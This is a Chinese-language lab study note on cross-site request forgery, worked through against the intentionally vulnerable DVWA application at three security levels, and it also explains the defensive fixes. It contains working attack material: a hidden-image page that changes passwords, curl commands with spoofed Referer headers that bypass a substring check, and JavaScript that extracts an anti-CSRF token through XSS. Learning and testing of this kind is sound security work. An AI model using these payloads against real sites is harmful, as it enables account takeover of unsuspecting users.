# Day 23 — CSRF（跨站请求伪造）学习总结

---

## 一、CSRF 是什么

```
攻击者构造恶意请求 → 诱导已登录的受害者触发 → 浏览器自动带上 Cookie → 服务器以为是受害者本人操作
```

**核心特征**：
- 不需要注入脚本（纯 HTML `<img>` 就能触发）
- 攻击者**看不到响应**（跨域限制，不同于 XSS）
- 利用的不是你的代码漏洞，而是**浏览器自动带 Cookie 的机制**

---

## 二、XSS vs CSRF 本质区别

| | XSS | CSRF |
|---|---|---|
| 攻击方式 | 注入脚本，在目标站执行 | 伪造请求，从攻击者站发起 |
| 能否读响应 | ✅ 能（同源内执行） | ❌ 不能（跨域限制） |
| 是否需要 JS | 需要 | 不需要，`<img>` 标签即可 |
| 防御手段 | 输入过滤 + 输出转义 | Token + Referer + SameSite Cookie |

---

## 三、DVWA CSRF 三级攻防

### Low 级：零防御

**源码**：直接处理请求，无任何检查

**攻击方式**：攻击者做一个恶意页面，`<img>` 标签触发改密码请求

```html
<!-- csrf_evil.html 恶意页面 -->
<img src="http://192.168.103.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
     width="0" height="0">
```

受害者打开恶意页面 → 浏览器自动加载 img → 自动带上 Cookie → 密码被改

---

### Medium 级：Referer 检查（有缺陷）

**源码核心**：
```php
stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false
```

**含义**：Referer 头中必须包含 `localhost`（本环境 SERVER_NAME = localhost）才放行

**验证结果**（4 组 curl 实验）：

| 场景 | Referer 值 | `stripos` 结果 | 放行？ |
|------|-----------|---------------|--------|
| 合法本站请求 | `http://localhost/dvwa/...` | 返回 int（找到） | ✅ 放行 |
| 攻击者域名 | `http://evil.com/...` | 返回 false | ❌ 拒绝 |
| 🔥 子域名钓鱼 | `http://localhost.evil.com/...` | 返回 int（找到） | ✅ **绕过！** |
| 空 Referer | 空 | 返回 false | ❌ 拒绝 |

**绕过原理**：`stripos` 只做**子串包含**检查，不做**域名归属**校验

```
"http://localhost.evil.com/..."
      ^^^^^^^^^
      这里有 localhost！stripos 找到了 → 放行
      但这不是 localhost 站，是攻击者的子域名！
```

**正确写法**：
```php
// ❌ 子串包含，能被绕过
stripos($referer, $server_name) !== false

// ✅ 解析 host 做严格相等
parse_url($referer, PHP_URL_HOST) === $server_name
```

**关键发现**：空 Referer 在 DVWA Medium 中**不能绕过**
```php
stripos("", "localhost") → false
false !== false → false → 拒绝
```
很多教程说"删 Referer 可绕过"——那只适用于代码用 `empty()`/`!isset()` 检查的场景

---

### High 级：Anti-CSRF Token（纯 CSRF 无法绕过）

**源码核心**：
```php
checkToken($token, $_SESSION['session_token'], 'index.php');  // 验证 token
generateSessionToken();                                        // 生成新 token（一次性）
```

**机制**：
```
1. 用户打开页面 → 服务器生成随机 token
2. token 存两份：① 服务器 Session  ② 表单隐藏字段
3. 用户提交 → 带上 token → 服务器对比
4. 一致 → 放行，生成新 token（旧的作废）
5. 不一致 → 拒绝
```

**为什么纯 CSRF 攻不破**：
```
攻击者要构造请求：?password_new=x&user_token=???
                                          ^^^^^
                                          攻击者不知道这个值！

→ 跨域读不到目标站页面内容（同源策略拦住）
→ token 是随机的，猜不到
→ 用完即废，偷到也过期
```

---

## 四、🔥 XSS + CSRF 组合攻击 — 攻破 Token 防御

**核心原理**：Token 防的是跨域读取，但 XSS 在同源内执行，同源策略管不着自己人

```
纯 CSRF（跨域）：evil.com → 读 DVWA Token → ❌ 同源策略拦住
XSS + CSRF（同源）：DVWA 自己页面 → 读 DVWA Token → ✅ 自己读自己
```

**攻击代码**（在 DVWA 页面控制台执行，模拟 XSS 同源执行）：
```javascript
fetch('/dvwa/vulnerabilities/csrf/')       // ① 偷偷请求 CSRF 页面
  .then(r => r.text())                     // ② 拿到 HTML 源码
  .then(html => {
    let match = html.match(/user_token' value='([^']+)'/);  // ③ 正则提取 token
    let token = match[1];                  // ④ 保存 token
    console.log('偷到的 Token:', token);

    fetch('/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&user_token=' + token + '&Change=Change')  // ⑤ 带token改密码
      .then(r => r.text())
      .then(resp => {
        console.log('服务器响应:', resp.match(/<pre>(.*?)<\/pre>/)?.[1]);  // ⑥ Password Changed
      });
  });
```

**攻击链路**：
```
攻击者注入 XSS → 受害者浏览页面 → JS 同源执行
→ fetch 拿到 CSRF 页面 → 提取 token → 带 token 提交改密码请求 → 密码被改
```

---

## 五、三级防御对比总结

| 等级 | 防御方式 | 纯CSRF能绕过？ | XSS+CSRF能绕过？ | 评价 |
|-----|---------|-------------|---------------|------|
| Low | 无 | ✅ 随便绕 | ✅ | 无防御 |
| Medium | Referer 检查（stripos） | ✅ 子域名钓鱼绕过 | ✅ | 实现有缺陷 |
| High | Anti-CSRF Token | ❌ 无法绕过 | ✅ XSS辅助可绕过 | 业界标准，但怕XSS |

**终极结论**：
- **Anti-CSRF Token 是正确的防御方向**，纯 CSRF 确实攻不破
- 但 **XSS 是一切防御的天敌**——只要存在 XSS，Token、Referer 等防御全部失效
- **防御必须整体做**：修好 XSS 漏洞 + 部署 CSRF Token + 设置 SameSite Cookie，缺一不可

---

## 六、今日实操命令记录

### 环境确认
```powershell
# 确认 SERVER_NAME 的值
curl -s "http://192.168.103.1/dvwa/phpinfo.php" -b "PHPSESSID=xxx" | findstr "SERVER_NAME"
# 结果：localhost
```

### CSRF Medium 四组验证
```powershell
# ① 合法来源（含 localhost）→ 放行
curl -s "http://192.168.103.1/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change" -H "Referer: http://localhost/dvwa/vulnerabilities/csrf/" -b "PHPSESSID=xxx; security=medium" | findstr "Password Changed"

# ② 攻击者域名（不含 localhost）→ 拒绝
curl -s "http://192.168.103.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" -H "Referer: http://evil.com/attack.html" -b "PHPSESSID=xxx; security=medium" | findstr "didn't look correct"

# ③ 🔥 子域名钓鱼（含 localhost）→ 绕过！
curl -s "http://192.168.103.1/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change" -H "Referer: http://localhost.evil.com/attack.html" -b "PHPSESSID=xxx; security=medium" | findstr "Password Changed"

# ④ 空 Referer → 拒绝
curl -s "http://192.168.103.1/dvwa/vulnerabilities/csrf/?password_new=nope&password_conf=nope&Change=Change" -H "Referer:" -b "PHPSESSID=xxx; security=medium" | findstr "didn't look correct"
```

### CSRF High 验证
```powershell
# 不带 Token → 被忽略
curl -s "http://192.168.103.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" -b "PHPSESSID=xxx; security=high" | findstr "Password Changed"
# 无输出 → 密码没改

# XSS+CSRF 组合攻击 → 浏览器控制台执行 JS → 偷 Token → 改密码成功
```

---

## 七、待办 / 下一步

- [ ] 完成 XSS+CSRF 组合攻击的浏览器控制台实操验证
- [ ] 还原 jsonp.php 文件（CSP High 级实操时被修改为 alert(1)）
- [ ] DVWA Setup / Reset DB 重置数据库恢复默认密码
- [ ] SQL注入补充版文档开头 `test heading` 残留待手动删除
